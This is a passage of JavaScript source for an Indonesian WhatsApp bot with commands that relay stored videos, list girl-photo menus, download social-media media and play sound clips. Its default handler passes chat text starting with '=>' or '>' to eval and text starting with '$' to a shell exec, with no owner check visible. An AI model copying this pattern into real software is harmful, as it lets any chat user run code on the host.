if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Atj0GXF8xJG1_FtFmqhvmMJPEHXB7eSHM3wALGDOXvlb.enc",
"mimetype": "video/mp4",
"fileSha256": "/sDEkoGNxpgjS8weScu1i533nHXD0ULjJtVjk4r4JLs=",
"fileLength": "1379041",
"seconds": 12,
"mediaKey": "jxflZEkUjR0AhXag19oj9rdjsSgmwTBumXccIkytHpQ=",
"height": 1024,
"width": 576,
"fileEncSha256": "C14HkQeXYa0Gw8NpMWP3ZjZs3yYA32N2zDCZXvdFwRs=",
"directPath": "/v/t62.7161-24/19973139_131567349549805_3848517727519291180_n.enc?ccb=11-4&oh=01_AdS6dcfUQSrX4-APQCPq_giZ1O4x4SMhNUfN4ChZ1V_ItA&oe=63E28F55",
"mediaKeyTimestamp": "1673208565",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAEBQABAwIBAAMBAQAAAAAAAAAAAAAAAAECAwAE/9oADAMBAAIQAxAAAAAM0cqdBZQm14GjEMt7VK5SrOnRzjwZKpC8kN0W95snRlCcOHrVhksuzmQmMcseA7HwjaQnRbICLxI0v//EACMQAAICAgIBBAMAAAAAAAAAAAECAAMREgQhMQUQE0EiMlH/2gAIAQEAAT8ARYidSy8qCVQlRFdbVyJYPauZ2QqB2RPhsao94nGbWzU/ctWaylMmbojgEgSy5C7pWfIgOto78GNq65BzNZSuCJzVK2k/RhJg7M4iOGIIIGJpKWnqPbD2rBLACVqde5iVtObYP1HtwKwzlj9QaaTev+w2tr+HZMdX8sDMTiMUeW2Fdp8zTiMBLArLgicaipV2xkzkso8ASx8ibSp9WE3BSIwSqWs1jHEbYTcz/8QAGREBAQEBAQEAAAAAAAAAAAAAAQARECES/9oACAECAQE/AODHrZkvy5B7LhKq25LsBMc//8QAGhEBAQEBAQEBAAAAAAAAAAAAAQARAiEQIv/aAAgBAwEBPwCxknwnrYNNl/Nya2gEc6Rznsrtw3b58//Z",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan8': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aqq_jkNyYUsq_QW2a-mC61yt8xm33M08jPw3eOST36TO.enc",
"mimetype": "video/mp4",
"fileSha256": "2rhn22K/f0B7VG12xpRWDuZsrwA3u9npLSWM+DI9h1Y=",
"fileLength": "3150798",
"seconds": 15,
"mediaKey": "/I6qQ/+w0FsZmF+AM07qm0ZxExekxH0b0LRjN3Z9TEQ=",
"height": 1024,
"width": 576,
"fileEncSha256": "cIGu3i7Ueqi2SfdwZ5N6g6eC8nzbHeQr8d7GkmtcLTM=",
"directPath": "/v/t62.7161-24/13156814_480613080901754_6912333234988724279_n.enc?ccb=11-4&oh=01_AdTjn3h8Uw8aL_rD8jllOhP9LURzBsdhBvVIFYfeGsmhXA&oe=63E2871B",
"mediaKeyTimestamp": "1673208654",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAR52Nd0JbcJAPISVXX2VVAuAMFLldOY0sbSVSyVQ7aWffB5F0cPZgjVOcbW3lN0KxvkEbLSBuf//EACcQAAICAgEBBwUAAAAAAAAAAAECABEDBBITEBQgISIxUTJBUlNh/9oACAEBAAE/APBUrsMrwGEgTqJ8wG+0tQilsr0I+ploVMfPGaMB7MreU0+KjkZiZCOX2m9SvaxX9M7z/Jk85oYUfFDgFH3m+iLhEBoL8XOvq/gsaaW10HIb2MDCuYYVN3Z6+Sh9ImjgQ4vWs7lr/rEw4+q5WY9AXbRMC8SsTRwK3KpiIUkS5rsRmWY3sGhOLUDFtqm0jI4ZDOrP/8QAGREAAgMBAAAAAAAAAAAAAAAAAAECEBEx/9oACAECAQE/ANtvBS2pC7UsNSY2yfFTP//EABsRAQADAAMBAAAAAAAAAAAAAAEAAhEQEiEg/9oACAEDAQE/APhE43r7FWvDNumMo1awieTcn//Z",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break
case 'asupan9': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
var video = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"videoMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvAKooRbWxXSy1OIq2NUzSdHzdYiL53kq7aroMdvHPIp.enc",
"mimetype": "video/mp4",
"fileSha256": "X1p6p8aFA6MrjTZESGaUv95yCT1CQAUFQZ+ak8JW4fo=",
"fileLength": "11040386",
"seconds": 15,
"mediaKey": "SLi/9IQAHvXf92Q9ZcnrB/aB708vtpWC9VRObsYunI8=",
"height": 1024,
"width": 576,
"fileEncSha256": "DrtvhP/j5ifQK/V5W5EoJa0ZoupWzMa7LQGSsr/8A+E=",
"directPath": "/v/t62.7161-24/30793932_559867169086420_4027102381465858290_n.enc?ccb=11-4&oh=01_AdRjPg04yZn67PXhqy-dIX9v3_e1fXmEcYo6Ak3JpjKWWA&oe=63E296C5",
"mediaKeyTimestamp": "1673208806",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAMFBgECAQEBAQEAAAAAAAAAAAAAAAABAgAD/9oADAMBAAIQAxAAAACjlTlzNdU9gy/ycuMhHfKc+yrtWzjWCzPTlwUljrnlJgzdvSeaFn616LQYi6mj5J7TLwAPoDa4kDH/xAAjEAACAgEDBAMBAAAAAAAAAAABAgADEgQRIRAxUVIFFCIT/9oACAEBAAE/AFsB7wr2IM2mnOdSzGY9K3I6aB/0UmMxlqMjFWGx6VPvwZU5SxDAQQD01enFpLEHKD4u4plCrVsQeCIluQAM0lmdI6KoIm81y76pwJgVM0uqNB2bsZ9yj2hs8HiZfgseABLLi9zPBtYwENRC7seJinsIltqkYuZnfchVnh3U7TTjO1Vg0lRHM+nR6xGxYGf0GwKmOCTl5MobC1TEs3AmYlyYniAkQMZ2IiWFlUAznyZ//8QAFhEBAQEAAAAAAAAAAAAAAAAAASAA/9oACAECAQE/AMWN/wD/xAAZEQACAwEAAAAAAAAAAAAAAAABEAARIAL/2gAIAQMBAT8AhzSPLs4//9k=",
}
}), { userJid: m.chat, quoted: m })
kesper.relayMessage(m.chat, video.message, { messageId: video.key.id })
}
break

case 'asupan10':{
reply(`Server Down Sementara`)
}
break
case 'igdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result[0]
if (url.includes('.mp4')) {
kesper.sendMessage(from, { video: { url }, mimetype: 'video/mp4' })
} else {
kesper.sendMessage(from, { image: { url } })
}
})
break
case 'igdl2':
if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
for (var x of data.result) {
if (x.includes('.mp4')) {
kesper.sendMessage(from, { video: { url: x }, mimetype: 'video/mp4' })
} else {
kesper.sendMessage(from, { image: { url: x } })
}
}
})
break
case 'twtdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
kesper.sendMessage(from, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
})
break
case 'fbdl':
if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
kesper.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4' })
})
break
case 'listasupan':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
touchmebree = [
{
title: `©️ Casper`,
rows: [
{title: `ASUPAN 1`, rowId: `${prefix}asupan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `ASUPAN 2`, rowId: `${prefix}asupan2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 3`, rowId: `${prefix}asupan3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 4`, rowId: `${prefix}asupan4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 5`, rowId: `${prefix}asupan5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 6`, rowId: `${prefix}asupan6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 7`, rowId: `${prefix}asupan7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 8`, rowId: `${prefix}asupan8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `ASUPAN 9`, rowId: `${prefix}asupan9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
  {title: `ASUPAN 10`, rowId: `${prefix}asupan10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
kesper.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Video Asupan Untuk Penyemangat Hari Mu🥳
Silahkan Klick List Yang Ada di Bawah

TTD
© KAUM PASCOL

Semoga Kalian Suka 🥳`, kesper.user.name, `Hay Kak List Asupan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
case 'listcecan':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
touchmebree = [
{
title: `©️ Casper`,
rows: [
{title: `CECAN 1`, rowId: `${prefix}cecan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
{title: `CECAN 2`, rowId: `${prefix}cecan2`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 3`, rowId: `${prefix}cecan3`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 4`, rowId: `${prefix}cecan4`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 5`, rowId: `${prefix}cecan5`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 6`, rowId: `${prefix}cecan6`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 7`, rowId: `${prefix}cecan7`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 8`, rowId: `${prefix}cecan8`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 9`, rowId: `${prefix}cecan9`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 10`, rowId: `${prefix}cecan10`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 11`, rowId: `${prefix}cecan11`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 12`, rowId: `${prefix}cecan12`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 13`, rowId: `${prefix}cecan13`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 14`, rowId: `${prefix}cecan14`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 15`, rowId: `${prefix}cecan15`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 16`, rowId: `${prefix}cecan16`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 17`, rowId: `${prefix}cecan17`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 18`, rowId: `${prefix}cecan18`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 19`, rowId: `${prefix}cecan19`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `},
 {title: `CECAN 20`, rowId: `${prefix}cecan20`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
 `}
]
}
]
kesper.sendListMsg(m.chat, `
Hii Guys Aku Menyediakan Foto Cecan Nih
Foto Cecan Random Dalam 20 Foto Semoga Suka 🥳

Semoga Kalian Suka 🥳`, kesper.user.name, `Hay Kak List Cecan Bot Ada Di List`, `Click Here 🌷`, touchmebree, m)
break
case 'ngakak': {
if (isBan) throw sticBanLu(from)
 hiy = fs.readFileSync('./casper-file/sound/ketawa.mp3')
 kesper.sendMessage(m.chat, {audio: hiy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ketawa': {
if (isBan) throw sticBanLu(from)
 hoy = fs.readFileSync('./casper-file/sound/ketawa.mp3')
 kesper.sendMessage(m.chat, {audio: hoy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'awkwk': case 'wkwk': {
if (isBan) throw sticBanLu(from)
 huy = fs.readFileSync('./casper-file/sound/awkwk.mp3')
 kesper.sendMessage(m.chat, {audio: huy, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'bang': {
if (isBan) throw sticBanLu(from)
 mi = fs.readFileSync('./casper-file/sound/dj kane.mp3')
 kesper.sendMessage(m.chat, {audio: mi, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'nob': {
if (isBan) throw sticBanLu(from)
 miki = fs.readFileSync('./casper-file/sound/nob.mp3')
 kesper.sendMessage(m.chat, {audio: miki, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'musik': {
if (isBan) throw sticBanLu(from)
 mo = fs.readFileSync('./casper-file/sound/ikehcok.mp3')
 kesper.sendMessage(m.chat, {audio: mo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'mastah': {
if (isBan) throw sticBanLu(from)
 mu = fs.readFileSync('./casper-file/sound/mastah.mp3')
 kesper.sendMessage(m.chat, {audio: mu, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'slebew': {
if (isBan) throw sticBanLu(from)
 me = fs.readFileSync('./casper-file/sound/ikehcok.mp3')
 kesper.sendMessage(m.chat, {audio: me, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'cantik': {
if (isBan) throw sticBanLu(from)
 muku = fs.readFileSync('./casper-file/sound/loli.mp3')
 kesper.sendMessage(m.chat, {audio: muku, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'kesel': {
if (isBan) throw sticBanLu(from)
 meke = fs.readFileSync('./casper-file/sound/kesel.mp3')
 kesper.sendMessage(m.chat, {audio: meke, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'ngeselin': {
if (isBan) throw sticBanLu(from)
 moko = fs.readFileSync('./casper-file/sound/ngeselin.mp3')
 kesper.sendMessage(m.chat, {audio: moko, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
case 'santuy': case 'kal': {
if (isBan) throw sticBanLu(from)
 mokoo = fs.readFileSync('./casper-file/sound/gaskeun.mp3')
 kesper.sendMessage(m.chat, {audio: mokoo, mimetype: 'audio/mpeg', ptt:true }, {quoted:m})
 }
 break
 //=================================================//

//=================================================//
default:
if (budy.startsWith('=>')) {
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
kesper.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})